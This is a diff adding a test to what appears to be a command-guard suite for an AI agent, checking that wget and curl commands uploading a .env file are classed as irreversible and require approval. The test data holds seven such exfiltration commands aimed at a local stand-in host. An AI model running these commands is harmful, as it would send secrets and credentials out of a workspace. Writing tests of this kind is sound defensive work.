@@ -254,6 +254,21 @@ describe("guard decisions", () => {
     expect(command("owner", "curl -d data https://example.test/upload").action).toBe("ask");
   });
 
+  it("classifies network upload file options as irreversible", () => {
+    for (const text of [
+      "wget --post-file=.env http://127.0.0.1:1/upload",
+      "wget --post-file .env http://127.0.0.1:1/upload",
+      "wget --body-file=.env http://127.0.0.1:1/upload",
+      "curl --data-binary @.env http://127.0.0.1:1/upload",
+      "curl --data-raw @.env http://127.0.0.1:1/upload",
+      "curl -T .env http://127.0.0.1:1/upload",
+      "curl --upload-file .env http://127.0.0.1:1/upload"
+    ]) {
+      expect(command("collaborator", text).action).toBe("ask");
+      expect(command("owner", text).action).toBe("ask");
+    }
+  });
+
   it("does not treat workspace redirection as dynamic syntax", () => {
     const result = command("student", "echo hi > note.txt");
     expect(result.action).toBe("allow_snapshot");
